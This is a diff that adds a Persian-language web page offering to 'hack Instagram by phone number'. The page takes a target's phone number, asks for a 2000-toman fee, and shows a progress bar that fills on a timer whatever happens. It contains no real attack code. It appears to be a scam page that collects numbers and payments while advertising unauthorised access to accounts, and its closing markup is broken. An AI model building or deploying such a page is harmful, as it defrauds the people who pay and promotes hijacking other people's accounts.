@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>هک اینستاگرام با شماره</title>
+    <link href="../source/hack/css/style.css" rel="stylesheet"/>
+    <link href="../source/hack/css/fontawesome.min.css" rel="stylesheet"/>
+</head>
+<body>
+<canvas id="canvas"></canvas>
+<div id="blur-background"></div>
+<div class="container main">
+    <div class="banner">
+        <div class="item html">
+            <img src="../source/hack/images/amplifier.png" alt="ببینو" class="clapper">
+        </div>
+    </div>
+    <div class="progress-bar">
+        <div id="bar" class="progress-value" style="width: 0%;">
+            <span id="value">start</span>
+        </div>
+    </div>
+    <h1 style="margin-bottom: 5px">هک اینستاگرام با شماره !!</h1>
+        <div id="step1" class="step">
+        <p class="title"> شماره هدف را وارد کنید تا در 1 دقیقه رمز پیج تحویل داده شود</p>
+
+        <form id="form_sendPin" action="index.php" method="post">
+            <input style="text-align: center;" type="tel" name="mobile" required="required" class="phone-input"
+                   id="phone-input"
+                   placeholder="شماره">
+            <i class="col-md-3 col-sm-4 col-8 mobile-justify keypad-parent"></i>
+            <!-- <i class="fas fa-phone input-icon phone-icon"></i> -->
+            <p class="error-message hidden"></p>
+            <p class="success-message hidden"></p>
+            <div class="loader hidden">در حال شروع هک پیج ...</div>
+            <button id="form_sendPin_button" class="action" type="submit">
+                <div class="pulse">
+                   پرداخت و شروع هک
+                </div>
+            </button>
+        </form>
+    </div>
+    <div class="message-condition" style="width: 100%;">
+        <a  target="_blank">به دلیل هزینه های سنگین 2000 تومان کارمزد دریافت میشود</a>
+    </div>
+</div>
+<script src="../source/hack/js/jquery.js"></script>
+<script src="../source/hack/js/script.js"></script>
+<script>
+    var elem = document.getElementById("bar");
+    var width = 1;
+    var id = setInterval(frame, 300);
+
+    function frame() {
+        if (width >= 100) {
+            clearInterval(id);
+        } else {
+            width++;
+            elem.style.width = width + '%';
+            document.getElementById("value").innerHTML = width + '%';
+        }
+    }
+</script>
+</body><head>
+    <style>img[alt="www.000webhost.com"]{display:none;}</style>
+  <meta charset="utf-8">
+  <title></title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style type="text/css">
+</html>
+
